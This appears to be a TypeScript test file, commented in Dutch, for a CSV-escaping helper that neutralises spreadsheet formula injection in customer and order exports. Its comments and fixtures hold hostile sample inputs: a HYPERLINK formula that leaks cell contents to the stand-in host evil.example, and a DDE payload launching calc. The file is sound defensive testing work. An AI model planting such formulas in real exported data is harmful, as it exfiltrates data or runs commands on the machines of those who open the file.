/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * CSV-formule-injectie (CWE-1236). Zowel de orderexport (server/routes/orders.ts)
 * als de klantenlijst-export (AdminCustomers.tsx) zetten velden in een CSV die
 * een anonieme bezoeker vrij kan invullen: `name`/`companyName` bij
 * zelfregistratie hebben geen tekenbeperking, en `customerName`/
 * `deliveryAddress` bij een order hebben alleen een lengtelimiet. Een klant kon
 * zich dus registreren met een naam als
 * `=HYPERLINK("http://evil.example/?x="&B2,"Open")`, en zodra een beheerder de
 * routinematige "Exporteer CSV" opent in Excel/Sheets, voert de spreadsheet die
 * formule uit — dat kan de inhoud van andere cellen naar een externe server
 * lekken, of in oudere Excel-versies met DDE zelfs commando's draaien.
 *
 * Alleen aanhalingstekens gebruiken (het oude gedrag in beide bestanden) lost
 * dit niet op: CSV-quoting bepaalt kolomscheiding, niet of de spreadsheet de
 * inhoud als formule leest. `"=1+1"` wordt in Excel nog altijd als formule
 * geopend. De vaste OWASP-mitigatie is een apostrof vóór elke waarde die met
 * =, +, -, @, tab of CR begint.
 */
import { describe, it, expect } from "vitest";
import { csvCell, toCsv } from "../utils/csv";

describe("csvCell — formule-triggers worden geneutraliseerd", () => {
  it.each(["=", "+", "-", "@", "\t"])("prefixt een waarde die begint met %j", (trigger) => {
    const payload = `${trigger}HYPERLINK(evil.example)`;
    expect(csvCell(payload)).toBe(`'${payload}`);
  });

  it("prefixt óók een waarde die met CR begint (die moet sowieso al gequote worden)", () => {
    const payload = "\rHYPERLINK(evil.example)";
    // CR triggert zowel de apostrof-prefix als reguliere CSV-quoting (een rauwe
    // CR zou de rij-indeling van het CSV-bestand breken).
    expect(csvCell(payload)).toBe(`"'${payload}"`);
  });

  it("laat gewone tekst ongemoeid", () => {
    expect(csvCell("Jan Jansen")).toBe("Jan Jansen");
    expect(csvCell("HuurGo B.V.")).toBe("HuurGo B.V.");
  });

  it("een minteken midden in de tekst is geen trigger", () => {
    expect(csvCell("06-12345678")).toBe("06-12345678");
  });

  it("quote nog steeds correct bij komma's, aanhalingstekens en newlines", () => {
    expect(csvCell("Jansen, Piet")).toBe('"Jansen, Piet"');
    expect(csvCell('Zeg "hallo"')).toBe('"Zeg ""hallo"""');
    expect(csvCell("regel1\nregel2")).toBe('"regel1\nregel2"');
  });

  it("een formuletrigger mét een komma krijgt zowel de apostrof als aanhalingstekens", () => {
    expect(csvCell("=SOM(A1,A2)")).toBe('"\'=SOM(A1,A2)"');
  });

  it("null/undefined wordt een lege cel, geen 'null'-tekst", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("getallen en overige waarden worden simpelweg tekst", () => {
    expect(csvCell(42)).toBe("42");
    expect(csvCell(19.5)).toBe("19.5");
  });
});

describe("toCsv — volledige rijen, CRLF-gescheiden", () => {
  it("bouwt een geldig CSV-bestand uit rijen", () => {
    // Geen komma's of aanhalingstekens in deze payload, dus geen extra quoting —
    // alleen de apostrof-prefix voor de formuletrigger.
    const csv = toCsv([
      ["Naam", "Bedrag"],
      ["Jan Jansen", 100],
      ["=cmd|'/c calc'!A1", 50]
    ]);
    expect(csv).toBe("Naam,Bedrag\r\nJan Jansen,100\r\n'=cmd|'/c calc'!A1,50");
  });

  it("een kwaadwillige klantnaam kan geen formule meer worden bij export", () => {
    const csv = toCsv([["Naam", "E-mail"], ['=HYPERLINK("http://evil.example")', "klant@voorbeeld.nl"]]);
    // De cel begint na het uitpakken van de CSV-quoting met een apostrof, niet met '='.
    const secondLine = csv.split("\r\n")[1];
    const nameCell = secondLine.slice(1, secondLine.lastIndexOf('","'));
    expect(nameCell.startsWith("'")).toBe(true);
    expect(nameCell.startsWith("=")).toBe(false);
  });
});
